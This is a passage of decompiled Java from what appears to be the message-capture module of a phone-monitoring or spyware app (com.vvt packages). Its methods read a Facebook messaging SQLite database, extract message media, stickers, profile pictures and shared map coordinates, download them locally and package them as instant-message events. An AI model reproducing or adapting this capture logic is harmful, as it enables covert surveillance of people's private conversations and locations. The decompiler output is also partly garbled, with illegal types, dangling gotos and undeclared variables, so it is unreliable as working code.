    //   677: astore 6
    //   679: goto -322 -> 357
    //   682: iconst_0
    //   683: istore 11
    //   685: aconst_null
    //   686: astore 6
    //   688: aload_3
    //   689: astore 7
    //   691: goto -334 -> 357
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	694	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	694	1	paramBoolean	boolean
    //   1	669	2	localObject1	Object
    //   5	684	3	str1	String
    //   7	347	4	i	int
    //   12	537	5	localStringBuilder	StringBuilder
    //   76	475	6	localObject2	Object
    //   563	1	6	localException1	Exception
    //   572	33	6	str2	String
    //   609	18	6	localObject3	Object
    //   631	1	6	localObject4	Object
    //   636	1	6	localObject5	Object
    //   644	1	6	localException2	Exception
    //   650	37	6	str3	String
    //   160	439	7	str4	String
    //   624	15	7	localObject6	Object
    //   647	1	7	localObject7	Object
    //   655	1	7	localException3	Exception
    //   659	31	7	str5	String
    //   163	417	8	bool	boolean
    //   166	258	9	str6	String
    //   171	133	10	str7	String
    //   208	476	11	j	int
    //   324	243	12	k	int
    // Exception table:
    //   from	to	target	type
    //   185	190	563	java/lang/Exception
    //   185	190	609	finally
    //   201	208	609	finally
    //   222	228	609	finally
    //   234	241	609	finally
    //   255	261	609	finally
    //   269	275	609	finally
    //   303	308	609	finally
    //   529	536	609	finally
    //   550	556	609	finally
    //   317	324	624	finally
    //   338	344	624	finally
    //   574	577	636	finally
    //   201	208	644	java/lang/Exception
    //   222	228	644	java/lang/Exception
    //   234	241	644	java/lang/Exception
    //   255	261	644	java/lang/Exception
    //   269	275	644	java/lang/Exception
    //   303	308	644	java/lang/Exception
    //   529	536	644	java/lang/Exception
    //   550	556	644	java/lang/Exception
    //   317	324	655	java/lang/Exception
    //   338	344	655	java/lang/Exception
  }
  
  private static String b(String paramString)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("msg_id AS id, ");
    Object[] arrayOfObject = new Object[1];
    arrayOfObject[0] = paramString;
    String str = String.format("%s ", arrayOfObject);
    localStringBuilder.append(str);
    localStringBuilder.append("FROM messages ");
    localStringBuilder.append("where id = ? ");
    return localStringBuilder.toString();
  }
  
  /* Error */
  private static List b(SQLiteDatabase paramSQLiteDatabase1, String paramString1, String paramString2, com.vvt.im.events.info.d paramd, String paramString3, SQLiteDatabase paramSQLiteDatabase2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 6
    //   3: aconst_null
    //   4: astore 7
    //   6: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   9: istore 8
    //   11: iload 8
    //   13: ifeq +3 -> 16
    //   16: new 555	java/util/ArrayList
    //   19: astore 9
    //   21: aload 9
    //   23: invokespecial 556	java/util/ArrayList:<init>	()V
    //   26: aload_0
    //   27: ifnull +453 -> 480
    //   30: new 168	java/lang/StringBuilder
    //   33: astore 10
    //   35: aload 10
    //   37: invokespecial 169	java/lang/StringBuilder:<init>	()V
    //   40: aload 10
    //   42: ldc_w 421
    //   45: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   48: pop
    //   49: aload 10
    //   51: ldc -81
    //   53: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   56: pop
    //   57: iconst_1
    //   58: istore 11
    //   60: iload 11
    //   62: anewarray 26	java/lang/String
    //   65: astore 12
    //   67: aload 12
    //   69: iconst_0
    //   70: aload_2
    //   71: aastore
    //   72: ldc_w 1238
    //   75: astore 13
    //   77: aconst_null
    //   78: astore 6
    //   80: aload 10
    //   82: invokevirtual 181	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   85: astore 14
    //   87: iconst_0
    //   88: istore 15
    //   90: aconst_null
    //   91: astore 16
    //   93: iconst_0
    //   94: istore 17
    //   96: aconst_null
    //   97: astore 18
    //   99: aconst_null
    //   100: astore 19
    //   102: aload_0
    //   103: astore 10
    //   105: aload_0
    //   106: aload 13
    //   108: aconst_null
    //   109: aload 14
    //   111: aload 12
    //   113: aconst_null
    //   114: aconst_null
    //   115: aconst_null
    //   116: invokevirtual 195	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   119: astore 10
    //   121: aload 10
    //   123: ifnull +406 -> 529
    //   126: aload 10
    //   128: invokeinterface 428 1 0
    //   133: istore 11
    //   135: iload 11
    //   137: ifeq +392 -> 529
    //   140: iconst_0
    //   141: istore 11
    //   143: aconst_null
    //   144: astore 13
    //   146: iconst_0
    //   147: newarray <illegal type>
    //   149: astore 13
    //   151: ldc_w 274
    //   154: astore 13
    //   156: aload 10
    //   158: aload 13
    //   160: invokeinterface 82 2 0
    //   165: istore 11
    //   167: aload 10
    //   169: iload 11
    //   171: invokeinterface 85 2 0
    //   176: astore 14
    //   178: ldc_w 278
    //   181: astore 13
    //   183: aload 14
    //   185: aload 13
    //   187: invokevirtual 281	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   190: iconst_1
    //   191: iadd
    //   192: istore 11
    //   194: aload 14
    //   196: iload 11
    //   198: invokevirtual 284	java/lang/String:substring	(I)Ljava/lang/String;
    //   201: astore 6
    //   203: ldc_w 276
    //   206: astore 13
    //   208: aload 10
    //   210: aload 13
    //   212: invokeinterface 82 2 0
    //   217: istore 11
    //   219: aload 10
    //   221: iload 11
    //   223: invokeinterface 85 2 0
    //   228: astore 13
    //   230: aload_0
    //   231: aload 14
    //   233: invokestatic 626	com/vvt/capture/removeFromPath/a/a:f	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   236: astore 12
    //   238: aload_0
    //   239: aload 14
    //   241: aload_1
    //   242: aload 4
    //   244: aload 5
    //   246: invokestatic 834	com/vvt/capture/removeFromPath/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase;)[B
    //   249: astore 16
    //   251: aload 16
    //   253: ifnull +55 -> 308
    //   256: aload 16
    //   258: arraylength
    //   259: istore 17
    //   261: iload 17
    //   263: ifle +45 -> 308
    //   266: getstatic 235	com/vvt/im/events/ImType:FACEBOOK	Lcom/vvt/im/events/ImType;
    //   269: astore 18
    //   271: getstatic 837	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   274: astore 19
    //   276: aload_1
    //   277: aload 18
    //   279: aload 19
    //   281: invokestatic 246	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   284: astore 18
    //   286: getstatic 837	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   289: astore 19
    //   291: aload 19
    //   293: invokestatic 249	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   296: astore 19
    //   298: aload 16
    //   300: aload 18
    //   302: aload 19
    //   304: invokestatic 254	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   307: pop
    //   308: aload_0
    //   309: aload 14
    //   311: aload_1
    //   312: aload 4
    //   314: aload 5
    //   316: invokestatic 834	com/vvt/capture/removeFromPath/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase;)[B
    //   319: astore 14
    //   321: aload 14
    //   323: ifnull +238 -> 561
    //   326: aload 14
    //   328: arraylength
    //   329: istore 15
    //   331: iload 15
    //   333: ifle +228 -> 561
    //   336: getstatic 235	com/vvt/im/events/ImType:FACEBOOK	Lcom/vvt/im/events/ImType;
    //   339: astore 16
    //   341: getstatic 837	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   344: astore 18
    //   346: aload_1
    //   347: aload 16
    //   349: aload 18
    //   351: invokestatic 246	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   354: astore 16
    //   356: getstatic 837	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   359: astore 18
    //   361: aload 18
    //   363: invokestatic 249	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   366: astore 18
    //   368: aload 14
    //   370: aload 16
    //   372: aload 18
    //   374: invokestatic 254	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   377: astore 14
    //   379: new 602	com/vvt/im/events/info/e
    //   382: astore 16
    //   384: aload 16
    //   386: invokespecial 838	com/vvt/im/events/info/e:<init>	()V
    //   389: aload 6
    //   391: ifnonnull +8 -> 399
    //   394: ldc_w 260
    //   397: astore 6
    //   399: aload 16
    //   401: aload 6
    //   403: invokevirtual 839	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
    //   406: aload 16
    //   408: aload 12
    //   410: invokevirtual 840	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   413: iconst_0
    //   414: ifne +89 -> 503
    //   417: aload 16
    //   419: aload 13
    //   421: invokevirtual 841	com/vvt/im/events/info/e:removeFromPath	(Ljava/lang/String;)V
    //   424: aload 16
    //   426: aload 14
    //   428: invokevirtual 842	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
    //   431: iconst_0
    //   432: istore 11
    //   434: aconst_null
    //   435: astore 13
    //   437: aload 16
    //   439: aconst_null
    //   440: invokevirtual 843	com/vvt/im/events/info/e:a	([B)V
    //   443: aload 9
    //   445: aload 16
    //   447: invokeinterface 565 2 0
    //   452: pop
    //   453: goto -327 -> 126
    //   456: astore 13
    //   458: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   461: istore 11
    //   463: iload 11
    //   465: ifeq +3 -> 468
    //   468: aload 10
    //   470: ifnull +10 -> 480
    //   473: aload 10
    //   475: invokeinterface 112 1 0
    //   480: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   483: istore 8
    //   485: iload 8
    //   487: ifeq +3 -> 490
    //   490: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   493: istore 8
    //   495: iload 8
    //   497: ifeq +3 -> 500
    //   500: aload 9
    //   502: areturn
    //   503: iconst_0
    //   504: istore 11
    //   506: aconst_null
    //   507: astore 13
    //   509: goto -92 -> 417
    //   512: astore 10
    //   514: aload 7
    //   516: ifnull +10 -> 526
    //   519: aload 7
    //   521: invokeinterface 112 1 0
    //   526: aload 10
    //   528: athrow
    //   529: aload 10
    //   531: ifnull -51 -> 480
    //   534: goto -61 -> 473
    //   537: astore 13
    //   539: aload 10
    //   541: astore 7
    //   543: aload 13
    //   545: astore 10
    //   547: goto -33 -> 514
    //   550: astore 10
    //   552: iconst_0
    //   553: istore 8
    //   555: aconst_null
    //   556: astore 10
    //   558: goto -100 -> 458
    //   561: aconst_null
    //   562: astore 14
    //   564: goto -185 -> 379
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	567	0	paramSQLiteDatabase1	SQLiteDatabase
    //   0	567	1	paramString1	String
    //   0	567	2	paramString2	String
    //   0	567	3	paramd	com.vvt.im.events.info.d
    //   0	567	4	paramString3	String
    //   0	567	5	paramSQLiteDatabase2	SQLiteDatabase
    //   1	401	6	str	String
    //   4	538	7	localObject1	Object
    //   9	545	8	bool1	boolean
    //   19	482	9	localArrayList	ArrayList
    //   33	441	10	localObject2	Object
    //   512	28	10	localObject3	Object
    //   545	1	10	localObject4	Object
    //   550	1	10	localException1	Exception
    //   556	1	10	localObject5	Object
    //   58	84	11	bool2	boolean
    //   165	268	11	i	int
    //   461	44	11	bool3	boolean
    //   65	344	12	localObject6	Object
    //   75	361	13	localObject7	Object
    //   456	1	13	localException2	Exception
    //   507	1	13	localObject8	Object
    //   537	7	13	localObject9	Object
    //   85	478	14	localObject10	Object
    //   88	244	15	j	int
    //   91	355	16	localObject11	Object
    //   94	168	17	k	int
    //   97	276	18	localObject12	Object
    //   100	203	19	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   126	133	456	java/lang/Exception
    //   146	149	456	java/lang/Exception
    //   158	165	456	java/lang/Exception
    //   169	176	456	java/lang/Exception
    //   185	190	456	java/lang/Exception
    //   196	201	456	java/lang/Exception
    //   210	217	456	java/lang/Exception
    //   221	228	456	java/lang/Exception
    //   231	236	456	java/lang/Exception
    //   244	249	456	java/lang/Exception
    //   256	259	456	java/lang/Exception
    //   266	269	456	java/lang/Exception
    //   271	274	456	java/lang/Exception
    //   279	284	456	java/lang/Exception
    //   286	289	456	java/lang/Exception
    //   291	296	456	java/lang/Exception
    //   302	308	456	java/lang/Exception
    //   314	319	456	java/lang/Exception
    //   326	329	456	java/lang/Exception
    //   336	339	456	java/lang/Exception
    //   341	344	456	java/lang/Exception
    //   349	354	456	java/lang/Exception
    //   356	359	456	java/lang/Exception
    //   361	366	456	java/lang/Exception
    //   372	377	456	java/lang/Exception
    //   379	382	456	java/lang/Exception
    //   384	389	456	java/lang/Exception
    //   401	406	456	java/lang/Exception
    //   408	413	456	java/lang/Exception
    //   419	424	456	java/lang/Exception
    //   426	431	456	java/lang/Exception
    //   439	443	456	java/lang/Exception
    //   445	453	456	java/lang/Exception
    //   80	85	512	finally
    //   115	119	512	finally
    //   126	133	537	finally
    //   146	149	537	finally
    //   158	165	537	finally
    //   169	176	537	finally
    //   185	190	537	finally
    //   196	201	537	finally
    //   210	217	537	finally
    //   221	228	537	finally
    //   231	236	537	finally
    //   244	249	537	finally
    //   256	259	537	finally
    //   266	269	537	finally
    //   271	274	537	finally
    //   279	284	537	finally
    //   286	289	537	finally
    //   291	296	537	finally
    //   302	308	537	finally
    //   314	319	537	finally
    //   326	329	537	finally
    //   336	339	537	finally
    //   341	344	537	finally
    //   349	354	537	finally
    //   356	359	537	finally
    //   361	366	537	finally
    //   372	377	537	finally
    //   379	382	537	finally
    //   384	389	537	finally
    //   401	406	537	finally
    //   408	413	537	finally
    //   419	424	537	finally
    //   426	431	537	finally
    //   439	443	537	finally
    //   445	453	537	finally
    //   458	461	537	finally
    //   80	85	550	java/lang/Exception
    //   115	119	550	java/lang/Exception
  }
  
  private static List b(String paramString1, String paramString2)
  {
    int i = 1;
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject2 = new org/json/JSONArray;
        ((JSONArray)localObject2).<init>(paramString1);
        if (localObject2 != null)
        {
          int k = ((JSONArray)localObject2).length();
          if (k > 0)
          {
            k = 0;
            str = null;
            localObject2 = ((JSONArray)localObject2).get(0);
            localObject2 = (JSONObject)localObject2;
            str = "media";
            int m = ((JSONObject)localObject2).has(str);
            if (m != 0)
            {
              str = "media";
              JSONArray localJSONArray = ((JSONObject)localObject2).getJSONArray(str);
              if (localJSONArray == null) {
                continue;
              }
              m = i;
              int j = localJSONArray.length();
              if (j <= 0) {
                continue;
              }
              j = i;
              j &= m;
              if (j != 0)
              {
                j = 0;
                localObject2 = null;
                localObject2 = localJSONArray.get(0);
                localObject2 = (JSONObject)localObject2;
                Object localObject3 = "src";
                localObject2 = ((JSONObject)localObject2).getString((String)localObject3);
                localObject3 = "&cfs=1";
                i = ((String)localObject2).endsWith((String)localObject3);
                if (i != 0)
                {
                  localObject3 = "&cfs=1";
                  localObject1 = "";
                  localObject2 = ((String)localObject2).replace((CharSequence)localObject3, (CharSequence)localObject1);
                }
                localObject3 = ImType.FACEBOOK;
                localObject1 = ImMediaFileType.THUMBMAIL;
                localObject3 = com.vvt.im.a.c.a(paramString2, (ImType)localObject3, (ImMediaFileType)localObject1);
                localObject1 = ImMediaFileType.THUMBMAIL;
                localObject1 = com.vvt.im.a.c.a((ImMediaFileType)localObject1);
                localObject3 = p.a((String)localObject3, (String)localObject1);
                bool1 = a;
                if (bool1) {}
                bool3 = c((String)localObject2, (String)localObject3);
                if (bool3)
                {
                  bool3 = a;
                  if (bool3) {}
                  localObject2 = new com/vvt/im/events/info/a;
                  ((com.vvt.im.events.info.a)localObject2).<init>();
                  bool1 = false;
                  localObject1 = null;
                  ((com.vvt.im.events.info.a)localObject2).a(null);
                  localObject1 = "image/png";
                  ((com.vvt.im.events.info.a)localObject2).b((String)localObject1);
                  ((com.vvt.im.events.info.a)localObject2).d((String)localObject3);
                  i = 0;
                  localObject3 = null;
                  ((com.vvt.im.events.info.a)localObject2).a(null);
                  i = 0;
                  localObject3 = null;
                  ((com.vvt.im.events.info.a)localObject2).c(null);
                  i = 0;
                  localObject3 = null;
                  ((com.vvt.im.events.info.a)localObject2).b(null);
                  localArrayList.add(localObject2);
                }
              }
            }
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject2;
        String str;
        int n;
        boolean bool3 = c;
        if (!bool3) {
          continue;
        }
        continue;
      }
      bool3 = a;
      if (bool3) {}
      return localArrayList;
      n = 0;
      str = null;
      continue;
      bool3 = false;
      localObject2 = null;
    }
  }
  
  private static List b(String paramString1, String paramString2, SQLiteDatabase paramSQLiteDatabase)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool2 = false;
    Object localObject3 = null;
    boolean bool3 = a;
    if (bool3) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int k;
    if (paramString2 != null)
    {
      k = paramString2.length();
      int m = 2;
      if (k <= m) {}
    }
    for (;;)
    {
      boolean bool1;
      try
      {
        JSONArray localJSONArray = new org/json/JSONArray;
        localJSONArray.<init>(paramString2);
        k = 0;
        i = localJSONArray.length();
        if (k < i)
        {
          localObject1 = localJSONArray.get(k);
          localObject1 = (JSONObject)localObject1;
          Object localObject4 = "href";
          boolean bool4 = ((JSONObject)localObject1).has((String)localObject4);
          if (bool4)
          {
            localObject3 = "href";
            localObject3 = ((JSONObject)localObject1).getString((String)localObject3);
          }
          bool4 = a;
          if ((!bool4) || (localObject3 != null))
          {
            localObject4 = "null";
            bool4 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
            if (!bool4) {
              break label620;
            }
          }
          if (paramSQLiteDatabase == null) {
            break label620;
          }
          localObject4 = "sticker_id";
          bool4 = ((JSONObject)localObject1).has((String)localObject4);
          if (!bool4) {
            break label620;
          }
          localObject3 = "sticker_id";
          localObject3 = ((JSONObject)localObject1).getString((String)localObject3);
          bool1 = a;
          if (bool1) {}
          localObject1 = b(paramSQLiteDatabase, (String)localObject3);
          bool4 = com.vvt.ag.b.a((String)localObject1);
          if (!bool4)
          {
            localObject4 = "null";
            bool4 = ((String)localObject1).equalsIgnoreCase((String)localObject4);
            if (!bool4) {}
          }
          else
          {
            localObject4 = "227878347358915";
            bool2 = ((String)localObject3).equals(localObject4);
            if (bool2)
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = "https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/851577_246547505491999_862435009_n.png";
            }
          }
          if (localObject1 != null)
          {
            localObject3 = "null";
            bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject3);
            if (!bool2)
            {
              localObject3 = ImType.FACEBOOK;
              localObject4 = ImMediaFileType.THUMBMAIL;
              localObject3 = com.vvt.im.a.c.a(paramString1, (ImType)localObject3, (ImMediaFileType)localObject4);
              localObject4 = ImMediaFileType.THUMBMAIL;
              localObject4 = com.vvt.im.a.c.a((ImMediaFileType)localObject4);
              Object localObject5 = new java/lang/StringBuilder;
              ((StringBuilder)localObject5).<init>();
              localObject3 = ((StringBuilder)localObject5).append((String)localObject3);
              localObject5 = File.separator;
              localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
              localObject3 = ((StringBuilder)localObject3).append((String)localObject4);
              localObject3 = ((StringBuilder)localObject3).toString();
              localObject4 = "https://";
              bool4 = ((String)localObject1).startsWith((String)localObject4);
              if (bool4)
              {
                localObject4 = "https://";
                localObject5 = "http://";
                localObject1 = ((String)localObject1).replace((CharSequence)localObject4, (CharSequence)localObject5);
                bool4 = a;
                if (!bool4) {}
              }
              localObject4 = ".webp";
              int n = ((String)localObject1).lastIndexOf((String)localObject4);
              int i1 = -1;
              if (n != i1)
              {
                i1 = 0;
                localObject5 = null;
                localObject1 = ((String)localObject1).substring(0, n);
              }
              boolean bool5 = c((String)localObject1, (String)localObject3);
              if (bool5)
              {
                localObject4 = new com/vvt/im/events/info/a;
                ((com.vvt.im.events.info.a)localObject4).<init>();
                i1 = 0;
                localObject5 = null;
                ((com.vvt.im.events.info.a)localObject4).a(null);
                localObject5 = "image/png";
                ((com.vvt.im.events.info.a)localObject4).b((String)localObject5);
                ((com.vvt.im.events.info.a)localObject4).d((String)localObject3);
                bool2 = false;
                localObject3 = null;
                ((com.vvt.im.events.info.a)localObject4).a(null);
                bool2 = false;
                localObject3 = null;
                ((com.vvt.im.events.info.a)localObject4).c(null);
                bool2 = false;
                localObject3 = null;
                ((com.vvt.im.events.info.a)localObject4).b(null);
                localArrayList.add(localObject4);
              }
              bool2 = b;
              if (!bool2) {}
            }
          }
          int j = k + 1;
          k = j;
          localObject3 = localObject1;
          continue;
        }
        bool1 = a;
      }
      catch (Exception localException)
      {
        bool1 = c;
        if (!bool1) {}
      }
      if (bool1) {}
      return localArrayList;
      label620:
      Object localObject2 = localObject3;
    }
  }
  
  private static void b(com.vvt.capture.b.d paramd)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = paramd.f();
    int i;
    Object localObject4;
    String str;
    if (localObject1 != null)
    {
      i = ((List)localObject1).size();
      if (i > 0)
      {
        localObject4 = ((List)localObject1).iterator();
        for (;;)
        {
          bool = ((Iterator)localObject4).hasNext();
          if (!bool) {
            break;
          }
          localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject4).next();
          str = ((com.vvt.im.events.info.a)localObject1).c();
          if (str != null) {}
          try
          {
            str = ((com.vvt.im.events.info.a)localObject1).c();
            com.vvt.io.d.b(str);
          }
          catch (Exception localException6)
          {
            Object localObject2;
            Object localObject3;
            for (;;) {}
          }
          str = ((com.vvt.im.events.info.a)localObject1).f();
          if (str != null) {
            try
            {
              localObject1 = ((com.vvt.im.events.info.a)localObject1).f();
              com.vvt.io.d.b((String)localObject1);
            }
            catch (Exception localException1) {}
          }
        }
      }
    }
    localObject2 = paramd.d();
    if (localObject2 != null)
    {
      localObject4 = ((com.vvt.im.events.info.d)localObject2).g();
      if (localObject4 == null) {}
    }
    try
    {
      localObject2 = ((com.vvt.im.events.info.d)localObject2).g();
      com.vvt.io.d.b((String)localObject2);
    }
    catch (Exception localException5)
    {
      for (;;) {}
    }
    localObject2 = paramd.e();
    if (localObject2 != null)
    {
      localObject4 = ((f)localObject2).f();
      if (localObject4 == null) {}
    }
    try
    {
      localObject2 = ((f)localObject2).f();
      com.vvt.io.d.b((String)localObject2);
    }
    catch (Exception localException4)
    {
      for (;;) {}
    }
    localObject2 = paramd.c();
    if (localObject2 != null)
    {
      i = ((List)localObject2).size();
      if (i > 0)
      {
        localObject4 = ((List)localObject2).iterator();
        for (;;)
        {
          bool = ((Iterator)localObject4).hasNext();
          if (!bool) {
            break;
          }
          localObject2 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
          str = ((com.vvt.im.events.info.e)localObject2).a();
          if (str != null) {
            try
            {
              localObject2 = ((com.vvt.im.events.info.e)localObject2).a();
              com.vvt.io.d.b((String)localObject2);
            }
            catch (Exception localException2) {}
          }
        }
      }
    }
    localObject3 = paramd.j();
    if (localObject3 != null)
    {
      localObject4 = ((com.vvt.im.events.info.b)localObject3).d();
      if (localObject4 == null) {}
    }
    try
    {
      localObject3 = ((com.vvt.im.events.info.b)localObject3).d();
      com.vvt.io.d.b((String)localObject3);
    }
    catch (Exception localException3)
    {
      for (;;) {}
    }
    bool = a;
    if (bool) {}
  }
  
  private static long c(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    localCursor = null;
    long l = -1;
    if (paramSQLiteDatabase != null) {}
    try
    {
      String str = b(paramString2);
      int i = 1;
      String[] arrayOfString = new String[i];
      arrayOfString[0] = paramString1;
      localCursor = paramSQLiteDatabase.rawQuery(str, arrayOfString);
      boolean bool1 = localCursor.moveToFirst();
      if (bool1)
      {
        int j = localCursor.getColumnIndex(paramString2);
        l = localCursor.getLong(j);
      }
      if (localCursor == null) {
        break label82;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if ((bool2) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label116;
      }
      localCursor.close();
    }
    localCursor.close();
    label82:
    return l;
  }
  
  private static com.vvt.im.events.info.c c(String paramString)
  {
    i = -1;
    boolean bool1 = true;
    boolean bool3 = false;
    Object localObject1 = null;
    boolean bool5 = a;
    if (bool5) {}
    bool5 = a;
    if (bool5) {}
    localc = new com/vvt/im/events/info/c;
    localc.<init>();
    str2 = "%252C";
    str3 = "q%3D";
    String str4 = "%26hl";
    for (;;)
    {
      try
      {
        JSONArray localJSONArray = new org/json/JSONArray;
        localJSONArray.<init>(paramString);
        if (localJSONArray != null)
        {
          bool5 = bool1;
          int n = localJSONArray.length();
          if (n <= 0) {
            continue;
          }
          bool1 &= bool5;
          if (bool1)
          {
            bool1 = false;
            localObject2 = null;
            localObject2 = localJSONArray.get(0);
            localObject2 = (JSONObject)localObject2;
            localObject1 = "name";
            bool3 = ((JSONObject)localObject2).has((String)localObject1);
            if (bool3)
            {
              localObject1 = "name";
              localObject1 = ((JSONObject)localObject2).getString((String)localObject1);
              localc.a((String)localObject1);
            }
            localObject1 = "href";
            bool3 = ((JSONObject)localObject2).has((String)localObject1);
            if (bool3)
            {
              localObject1 = "href";
              str5 = ((JSONObject)localObject2).getString((String)localObject1);
              k = str5.indexOf(str3);
              i1 = str3.length() + k;
              k = str5.indexOf(str4);
              if (k == i) {
                k = str5.length();
              }
            }
          }
        }
      }
      catch (JSONException localJSONException)
      {
        Object localObject2;
        String str5;
        int k;
        int i1;
        double d1;
        double d2;
        boolean bool4;
        String str1;
        int j;
        int m;
        double d3;
        boolean bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      try
      {
        localObject1 = str5.substring(i1, k);
        localObject1 = ((String)localObject1).split(str2);
        bool5 = false;
        str5 = null;
        str5 = localObject1[0];
        d1 = Double.parseDouble(str5);
        localc.a(d1);
        bool5 = true;
        localObject1 = localObject1[bool5];
        d2 = Double.parseDouble((String)localObject1);
        localc.b(d2);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        bool4 = b;
        if (!bool4) {
          continue;
        }
        str1 = "%2C";
        str5 = "markers=";
        str2 = "&language";
        str3 = "media";
        localObject2 = ((JSONObject)localObject2).getJSONArray(str3);
        i1 = 0;
        str3 = null;
        localObject2 = ((JSONArray)localObject2).getJSONObject(0);
        str3 = "src";
        str3 = ((JSONObject)localObject2).getString(str3);
        j = str3.indexOf(str5);
        m = str5.length() + j;
        j = str3.indexOf(str2);
        if (j != i) {
          continue;
        }
        j = str3.length();
        localObject2 = str3.substring(m, j);
        localObject2 = ((String)localObject2).split(str1);
        bool4 = false;
        str1 = null;
        str1 = localObject2[0];
        d2 = Double.parseDouble(str1);
        localc.a(d2);
        bool4 = true;
        localObject2 = localObject2[bool4];
        d3 = Double.parseDouble((String)localObject2);
        localc.b(d3);
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localc;
      bool5 = false;
      str5 = null;
      continue;
      bool1 = false;
      localObject2 = null;
    }
  }
  
  private static void c(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 1;
    int j = 0;
    int k = i;
    while (k == i)
    {
      k = 6;
      if (j >= k) {
        break;
      }
      k = d(paramSQLiteDatabase, paramString);
      long l = 10000L;
      SystemClock.sleep(l);
      j += 1;
    }
  }
  
  private static boolean c(String paramString1, String paramString2)
  {
    boolean bool1 = false;
    bool2 = a;
    if (bool2) {}
    e = false;
    ConditionVariable localConditionVariable = new android/os/ConditionVariable;
    localConditionVariable.<init>();
    try
    {
      URL localURL = new java/net/URL;
      localURL.<init>(paramString1);
      Thread localThread = new java/lang/Thread;
      b localb = new com/vvt/capture/b/a/b;
      localb.<init>(paramString1, localURL, paramString2, localConditionVariable);
      localThread.<init>(localb);
      localThread.start();
      long l = 180000L;
      bool2 = localConditionVariable.block(l);
      if (bool2) {
        bool1 = e;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = b;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private static int d(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 1;
    localCursor = null;
    if (paramSQLiteDatabase != null) {}
    try
    {
      String str = f();
      boolean bool1 = a;
      if (bool1) {}
      bool1 = true;
      String[] arrayOfString = new String[bool1];
      arrayOfString[0] = paramString;
      localCursor = paramSQLiteDatabase.rawQuery(str, arrayOfString);
      boolean bool2 = localCursor.moveToNext();
      if (bool2)
      {
        str = "is_non_authoritative";
        int j = localCursor.getColumnIndex(str);
        i = localCursor.getInt(j);
      }
      if (localCursor == null) {
        break label94;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = c;
        if ((bool3) && (localCursor == null)) {}
      }
